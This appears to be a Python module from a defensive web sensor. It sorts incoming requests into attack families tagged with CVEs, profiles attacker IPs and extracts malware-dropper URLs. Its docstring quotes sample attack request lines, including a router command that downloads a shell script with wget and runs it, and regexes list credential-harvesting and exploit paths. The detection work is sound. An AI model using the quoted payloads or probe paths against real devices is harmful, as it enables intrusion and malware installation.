"""Per-IP aggregation, probe families and dropper extraction (the sensor's brain).

Lifted from Ninja's perimeter_push.py: the FAMILIES table (well-known, unambiguous attack paths, with the CVE
where one applies), path normalisation (bounded patterns), UA families, the keep/drop rules (only global,
non-owner, non-Cloudflare-edge addresses are profiled) and the `Agg` per-IP aggregate. New here:

  droppers(): the URLs an attacker tries to make your server fetch, pulled out of the request line itself:
      GET /shell?cd+/tmp;wget+http://1.2.3.4/x.sh;chmod+777+x.sh;sh+x.sh         (router/IoT RCE)
      /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget http://..)   (TP-Link)
      POST /goform/set_LimitClient_cfg ... url-encoded `curl http://...`
  These are the "load the malware in situ" path: the sandbox can fetch them (opt-in) into the cell.
"""
from __future__ import annotations

import ipaddress
import re
import time
from typing import Dict, List, Optional
from urllib.parse import unquote_plus

CF_NETS = [ipaddress.ip_network(n) for n in (
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22", "2400:cb00::/32", "2606:4700::/32", "2803:f800::/32",
    "2405:b500::/32", "2405:8100::/32", "2a06:98c0::/29", "2c0f:f248::/32")]
ASSET = re.compile(r"\.(js|mjs|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|webp|avif|mp4|webm)$", re.I)
INTERNAL_UA = re.compile(r"ninja-sandbox|uptime-kuma|kube-probe|ELB-HealthChecker|GoogleHC", re.I)

FAMILIES = [
    ("ai-keys", re.compile(r"(?:/|\.env\.|\.)(?:anthropic|openai|claude|ollama|huggingface|hf_token|gemini|mistral|cohere)(?:[/._-]|$)", re.I), None),
    ("env-harvest", re.compile(r"/\.env|/\.aws/|/credentials|/config\.(json|ya?ml|php)$|/\.npmrc|/\.docker|/\.kube|/secrets?\b|/\.ssh/|/id_rsa|/\.htpasswd|/\.ds_store|/phpinfo", re.I), None),
    ("git-leak", re.compile(r"/\.(git|svn|hg)(/|$)", re.I), None),
    ("spring-actuator", re.compile(r"/actuator/gateway", re.I), "CVE-2022-22947"),
    ("actuator", re.compile(r"/actuator(/|$)|/jolokia|/heapdump", re.I), None),
    ("phpunit-rce", re.compile(r"eval-stdin\.php", re.I), "CVE-2017-9841"),
    ("php-cgi", re.compile(r"/php-cgi(\.exe)?|\?-d\+allow_url_include|%ADd\+allow_url_include", re.I), "CVE-2024-4577"),
    ("thinkphp-rce", re.compile(r"invokefunction|think\\\\app|/index\.php\?s=/", re.I), "CVE-2018-20062"),
    ("citrix-traversal", re.compile(r"/vpns?/|/vpn/\.\./", re.I), "CVE-2019-19781"),
    ("fortinet-traversal", re.compile(r"/remote/fgt_lang", re.I), "CVE-2018-13379"),
    ("pulse-traversal", re.compile(r"/dana-na/", re.I), "CVE-2019-11510"),
    ("f5-bigip", re.compile(r"/mgmt/tm/util/bash", re.I), "CVE-2022-1388"),
    ("exchange-proxyshell", re.compile(r"/autodiscover/autodiscover\.json", re.I), "CVE-2021-34473"),
    ("weblogic", re.compile(r"/console/css/%25?2e|/console/images/%25?2e", re.I), "CVE-2020-14882"),
    ("confluence-ognl", re.compile(r"\$\{|%24%7b", re.I), "CVE-2022-26134"),
    ("tplink-luci", re.compile(r"/cgi-bin/luci/;stok=", re.I), "CVE-2023-1389"),
    ("gpon-router", re.compile(r"/GponForm", re.I), "CVE-2018-10561"),
    ("dlink-hnap", re.compile(r"/HNAP1", re.I), "CVE-2015-2051"),
    ("jaws-webserver", re.compile(r"/shell\?cd", re.I), None),
    ("tenda-rce", re.compile(r"/goform/set_LimitClient_cfg|/goform/setUsbUnload", re.I), "CVE-2020-10987"),
    ("netgear-rce", re.compile(r"/setup\.cgi\?next_file=", re.I), "CVE-2016-6277"),
    ("geoserver", re.compile(r"/geoserver/", re.I), "CVE-2024-36401"),
    ("webshell", re.compile(r"(wso|alfa|shell|c99|r57|b374k|filemanager|mini|up|cmd|x|0|1|2|3|a|z)\d*\.php$|/wp-content/plugins/[^/]+/[^/]*\.php$|/\.well-known/[^/]*\.php$|_filemanager", re.I), None),
    ("wp-bruteforce", re.compile(r"/wp-login\.php|/xmlrpc\.php", re.I), None),
    ("wordpress-recon", re.compile(r"/wp-(admin|content|includes|json)|wlwmanifest", re.I), None),
    ("admin-panels", re.compile(r"/phpmyadmin|/pma|/adminer|/manager/html|/solr/|/jenkins|/owa/|/ecp/|/\+CSCOE\+", re.I), None),
    ("cgi-bin", re.compile(r"/cgi-bin/", re.I), None),
    ("router-iot", re.compile(r"/boaform|/goform|/setup\.cgi|/shell\?|/apply\.cgi|/cgi-bin/ViewLog\.asp|/picsdesc\.xml", re.I), None),
    ("php-probe", re.compile(r"\.php\d?$", re.I), None),
    ("java-probe", re.compile(r"\.(jsp|do|action)$", re.I), None),
    ("aspx-probe", re.compile(r"\.(aspx?|ashx|asmx)$", re.I), None),
]
QUERY_FAMILIES = {"php-cgi", "thinkphp-rce", "confluence-ognl", "jaws-webserver", "tplink-luci", "netgear-rce"}
DROPPER_RE = re.compile(r"(?:wget|curl|tftp\s+-g\s+-r|ftpget|fetch)\s+(?:-[A-Za-z]+\s+)*(?P<url>(?:https?|ftp|tftp)://[^\s;|&'\"<>)}]{4,200}|(?:\d{1,3}\.){3}\d{1,3}(?::\d{2,5})?/[^\s;|&'\"<>)}]{1,120})", re.I)
URL_IN_QUERY_RE = re.compile(r"(?:https?|ftp|tftp)://(?:\d{1,3}\.){3}\d{1,3}(?::\d{2,5})?/[^\s;|&'\"<>)}]{1,120}", re.I)


def classify_path(uri: str):
    bare = (uri or "").split("?")[0]
    for fam, rx, cve in FAMILIES:
        if rx.search(uri if fam in QUERY_FAMILIES else bare):
            return fam, cve
    return None


def normalise(path: str) -> str:
    p = (path or "/").split("?")[0].split("#")[0].lower()
    p = re.sub(r"/{2,}", "/", p)
    p = re.sub(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", "{uuid}", p)
    p = re.sub(r"\b[0-9a-f]{16,}\b", "{hex}", p)
    p = re.sub(r"\d{3,}", "{n}", p)
    segs = [s for s in p.split("/") if s]
    if len(segs) > 3:
        segs = segs[:3] + ["…"]
    return ("/" + "/".join(segs))[:80] or "/"


def ua_family(ua: str) -> str:
    u = (ua or "").lower()
    if not u:
        return "empty"
    for key, fam in (("googlebot", "googlebot"), ("bingbot", "bingbot"), ("gptbot", "gptbot"), ("claudebot", "claudebot"),
                     ("perplexity", "perplexitybot"), ("ahrefs", "ahrefsbot"), ("semrush", "semrushbot"), ("censys", "censys"),
                     ("shodan", "shodan"), ("zgrab", "zgrab"), ("masscan", "masscan"), ("nmap", "nmap"), ("nuclei", "nuclei"),
                     ("sqlmap", "sqlmap"), ("nikto", "nikto"), ("python-requests", "python-requests"), ("python-urllib", "python-urllib"),
                     ("aiohttp", "aiohttp"), ("go-http-client", "go-http-client"), ("curl", "curl"), ("wget", "wget"), ("okhttp", "okhttp"),
                     ("java/", "java"), ("libwww-perl", "perl"), ("headlesschrome", "headless-chrome"), ("hello world", "mirai-hello"),
                     ("bot", "other-bot"), ("crawl", "other-bot"), ("spider", "other-bot")):
        if key in u:
            return fam
    if u.startswith("mozilla/"):
        return "browser-like"
    return "other"


def droppers(uri: str) -> List[str]:
    """Dropper URLs embedded in a request line (decoded once; `+` as space), normalised to a scheme://host/path."""
    if not uri or len(uri) < 12:
        return []
    dec = unquote_plus(uri)
    out: List[str] = []
    for m in DROPPER_RE.finditer(dec):
        u = m.group("url")
        if "://" not in u:
            u = "http://" + u
        if u not in out:
            out.append(u)
    for u in URL_IN_QUERY_RE.findall(dec):
        if u not in out and ("sh" in u.rsplit("/", 1)[-1] or "bin" in u or re.search(r"\.(sh|bin|elf|x86|arm\d?|mips|mpsl|m68k|sh4|ppc|spc|exe)\b", u, re.I)):
            out.append(u)
    return out[:5]


def load_nets(specs: List[str]) -> list:
    nets = []
    for s in specs or []:
        s = s.split("#")[0].strip()
        if not s:
            continue
        try:
            nets.append(ipaddress.ip_network(s, strict=False))
        except ValueError:
            pass
    return nets


def keep_ip(ip: str, owner_nets) -> bool:
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    if not a.is_global:
        return False
    if any(a in n for n in owner_nets if n.version == a.version):
        return False
    return not any(a in n for n in CF_NETS if n.version == a.version)


class Agg:
    """Per-IP aggregate for one window (the telemetry row format = Ninja's perimeter ingest rows)."""

    def __init__(self):
        self.ips: Dict[str, dict] = {}
        self.lines = self.kept = self.dropped = self.unparsed = 0
        self.droppers: List[dict] = []

    def add(self, r: dict, owner_nets) -> Optional[dict]:
        self.lines += 1
        ip = r.get("ip") or ""
        if not keep_ip(ip, owner_nets) or INTERNAL_UA.search(r.get("user_agent") or ""):
            self.dropped += 1
            return None
        self.kept += 1
        ts = float(r.get("ts") or time.time())
        host = r.get("host") or "?"
        st = int(r.get("status") or 0)
        sc = f"s{st // 100}xx" if 100 <= st < 600 else "sother"
        row = self.ips.get(ip)
        if row is None:
            row = self.ips[ip] = {"ip": ip, "req": 0, "first": ts, "last": ts, "cc": "", "sites": {}, "probes": {}, "ua": {}, "status": {}, "droppers": []}
        row["req"] += 1
        row["first"], row["last"] = min(row["first"], ts), max(row["last"], ts)
        if r.get("cc") and r["cc"] not in ("XX", "T1"):
            row["cc"] = r["cc"]
        row["status"][sc] = row["status"].get(sc, 0) + 1
        s = row["sites"].get(host)
        if s is None:
            s = row["sites"][host] = {"req": 0, "first": ts, "last": ts, "status": {}}
        s["req"] += 1
        s["first"], s["last"] = min(s["first"], ts), max(s["last"], ts)
        s["status"][sc] = s["status"].get(sc, 0) + 1
        f = ua_family(r.get("user_agent") or "")
        row["ua"][f] = row["ua"].get(f, 0) + 1
        uri = r.get("uri") or "/"
        clean = uri.split("?")[0]
        if not ASSET.search(clean):
            c = classify_path(uri)
            if c:
                pat = normalise(clean)
                p = row["probes"].get(pat)
                if p is None and len(row["probes"]) < 60:
                    p = row["probes"][pat] = {"family": c[0], "cve": c[1], "count": 0, "first": ts, "last": ts}
                if p is not None:
                    p["count"] += 1
                    p["first"], p["last"] = min(p["first"], ts), max(p["last"], ts)
            for u in droppers(uri):
                if u not in row["droppers"] and len(row["droppers"]) < 10:
                    row["droppers"].append(u)
                self.droppers.append({"ts": ts, "ip": ip, "url": u, "host": host, "uri": uri[:300], "family": c[0] if c else None, "cve": c[1] if c else None})
        return row

    def rows(self) -> List[dict]:
        return list(self.ips.values())
